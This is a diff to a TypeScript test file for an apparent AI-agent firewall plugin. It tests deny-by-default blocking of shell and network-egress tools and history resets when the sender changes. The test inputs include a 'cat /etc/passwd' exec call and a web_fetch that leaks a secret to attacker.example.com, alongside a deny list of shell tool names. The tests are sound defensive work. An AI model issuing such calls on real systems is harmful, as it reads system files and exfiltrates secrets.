@@ -53,9 +53,19 @@ function buildFakeApi(pluginConfig?: Record<string, unknown>): {
   api: FakeApi;
   hooks: RegisteredHooks;
 } {
+  // Production default for deniedTools includes shell-class names
+  // (exec, shell, bash, …) and network egress names (web_fetch, …).
+  // Pre-existing tests use ``shell`` / ``code.exec`` as generic
+  // synthetic tool names to exercise the firewall enforcement flow
+  // — they're testing the decision-routing plumbing, not the deny
+  // path. Default ``deniedTools: []`` so those tests aren't
+  // accidentally short-circuited; tests that DO want to assert the
+  // production default override this with ``deniedTools: undefined``
+  // or pass an explicit list.
+  const fullConfig = { deniedTools: [] as string[], ...(pluginConfig ?? {}) };
   const hooks: RegisteredHooks = {};
   const api: FakeApi = {
-    pluginConfig,
+    pluginConfig: fullConfig,
     logger: { info: vi.fn(), warn: vi.fn() },
     on: (name, handler) => {
       if (name === "llm_input") hooks.llm_input = handler;
@@ -724,6 +734,173 @@ describe("firewall enforcement", () => {
     expect(body.params).toEqual({ q: "x" });
     expect(body.agent).toBe("bot.support");
     expect(body.session_id).toBe("s-1");
+  });
+});
+
+
+// ----- L1.5 deny-by-default (TENANT_ISOLATION_SPEC §2.2) -----------------
+
+describe("L1.5 deny-by-default", () => {
+  test("exec is blocked by default (no decide call) and emits a violation row", async () => {
+    // Pass deniedTools: undefined to RESTORE the production default
+    // (buildFakeApi defaults it to [] for legacy test compatibility).
+    const { api, hooks } = buildFakeApi({
+      host: "http://lumin.test",
+      deniedTools: undefined,
+    });
+    // @ts-expect-error
+    luminPlugin.register(api);
+
+    const result = await hooks.before_tool_call!(
+      { runId: "r-deny-1", toolCallId: "tc-1", toolName: "exec",
+        params: { command: "cat /etc/passwd" } },
+      { runId: "r-deny-1", senderId: "U09CMSPA2QY" },
+    );
+    expect(result).toEqual({
+      block: true,
+      blockReason: "lumin_egress:exec_denied:exec",
+    });
+    // Decide is NOT called — we short-circuit before the server.
+    const decideHits = fetchMock.mock.calls.filter(
+      (c) => String(c[0]).endsWith("/v1/policy/decide"),
+    );
+    expect(decideHits.length).toBe(0);
+    // Let the fire-and-forget violation POST settle.
+    await new Promise((r) => setTimeout(r, 5));
+    // Violation IS recorded.
+    const violationHits = fetchMock.mock.calls.filter(
+      (c) => String(c[0]).endsWith("/v1/violations"),
+    );
+    expect(violationHits.length).toBe(1);
+    const body = JSON.parse((violationHits[0][1] as { body: string }).body);
+    expect(body.violations[0].policy_name).toBe("lumin_egress_deny:exec");
+    expect(body.violations[0].action_taken).toBe("block");
+    expect(body.violations[0].severity).toBe("high");
+  });
+
+  test("web_fetch is blocked by default (network egress class)", async () => {
+    const { api, hooks } = buildFakeApi({
+      host: "http://lumin.test",
+      deniedTools: undefined,
+    });
+    // @ts-expect-error
+    luminPlugin.register(api);
+
+    const result = await hooks.before_tool_call!(
+      { runId: "r-deny-2", toolCallId: "tc-2", toolName: "web_fetch",
+        params: { url: "https://attacker.example.com?leak=secret" } },
+      { runId: "r-deny-2", senderId: "U09CMSPA2QY" },
+    );
+    expect(result).toEqual({
+      block: true,
+      blockReason: "lumin_egress:exec_denied:web_fetch",
+    });
+  });
+
+  test("operator can override deniedTools to allow specific shells", async () => {
+    const { api, hooks } = buildFakeApi({
+      host: "http://lumin.test",
+      // Operator opts exec back in (e.g., a CTF / dev environment).
+      deniedTools: ["bash", "shell"],
+    });
+    // @ts-expect-error
+    luminPlugin.register(api);
+
+    mockDecideOnce({ decision: "allow", duration_ms: 1 });
+
+    const result = await hooks.before_tool_call!(
+      { runId: "r-allow-1", toolCallId: "tc-1", toolName: "exec",
+        params: { command: "ls" } },
+      { runId: "r-allow-1" },
+    );
+    expect(result).toBeUndefined();
+  });
+});
+
+
+// ----- L2 history reset on sender switch (TENANT_ISOLATION_SPEC §2.3) ----
+
+describe("L2 history reset", () => {
+  test("sender switch on the same agent clears event.messages in place", async () => {
+    const { api, hooks } = buildFakeApi({ host: "http://lumin.test" });
+    // @ts-expect-error
+    luminPlugin.register(api);
+
+    // Reset shared global so this test isn't polluted by prior runs.
+    const g = globalThis as unknown as {
+      __lumin_lastSenderByAgent?: Map<string, string>;
+    };
+    g.__lumin_lastSenderByAgent?.clear();
+
+    // Telegram sender plants on agent "main"
+    mockDecideOnce({ decision: "allow", duration_ms: 1 });
+    await hooks.before_prompt_build!(
+      {
+        prompt: "alice plants data",
+        messages: [
+          { role: "user", content: "alice msg 1" },
+          { role: "assistant", content: "alice resp 1" },
+        ],
+        systemPrompt: "system",
+      },
+      { agentId: "main", sessionKey: "agent:main:telegram:default:direct:5706212396", senderId: "5706212396" },
+    );
+
+    // Slack sender (same agent) — L2 should clear messages.
+    mockDecideOnce({ decision: "allow", duration_ms: 1 });
+    const event2: { prompt: string; messages: unknown[]; systemPrompt: string } = {
+      prompt: "bob asks for data",
+      messages: [
+        { role: "user", content: "alice msg 1" },
+        { role: "assistant", content: "alice resp 1 (foreign tenant)" },
+        { role: "user", content: "bob msg 1" },
+      ],
+      systemPrompt: "system",
+    };
+    await hooks.before_prompt_build!(
+      event2,
+      { agentId: "main", sessionKey: "agent:main:slack:channel:c0b2q6hsxcn", senderId: "U09CMSPA2QY" },
+    );
+
+    expect(event2.messages.length).toBe(0);
+    // System prompt is preserved — it's static operator content, not tenant data.
+    expect(event2.systemPrompt).toBe("system");
+  });
+
+  test("same sender on the same agent does NOT clear messages", async () => {
+    const { api, hooks } = buildFakeApi({ host: "http://lumin.test" });
+    // @ts-expect-error
+    luminPlugin.register(api);
+
+    const g = globalThis as unknown as {
+      __lumin_lastSenderByAgent?: Map<string, string>;
+    };
+    g.__lumin_lastSenderByAgent?.clear();
+
+    // Turn 1
+    mockDecideOnce({ decision: "allow", duration_ms: 1 });
+    await hooks.before_prompt_build!(
+      { prompt: "turn 1", messages: [{ role: "user", content: "hi" }], systemPrompt: "s" },
+      { agentId: "main", sessionKey: "agent:main:telegram:default:direct:5706212396", senderId: "5706212396" },
+    );
+
+    // Turn 2 — same sender. Expect history preserved.
+    mockDecideOnce({ decision: "allow", duration_ms: 1 });
+    const event2: { prompt: string; messages: unknown[]; systemPrompt: string } = {
+      prompt: "turn 2",
+      messages: [
+        { role: "user", content: "hi" },
+        { role: "assistant", content: "hello" },
+        { role: "user", content: "what's up" },
+      ],
+      systemPrompt: "s",
+    };
+    await hooks.before_prompt_build!(
+      event2,
+      { agentId: "main", sessionKey: "agent:main:telegram:default:direct:5706212396", senderId: "5706212396" },
+    );
+
+    expect(event2.messages.length).toBe(3);
   });
 });
 
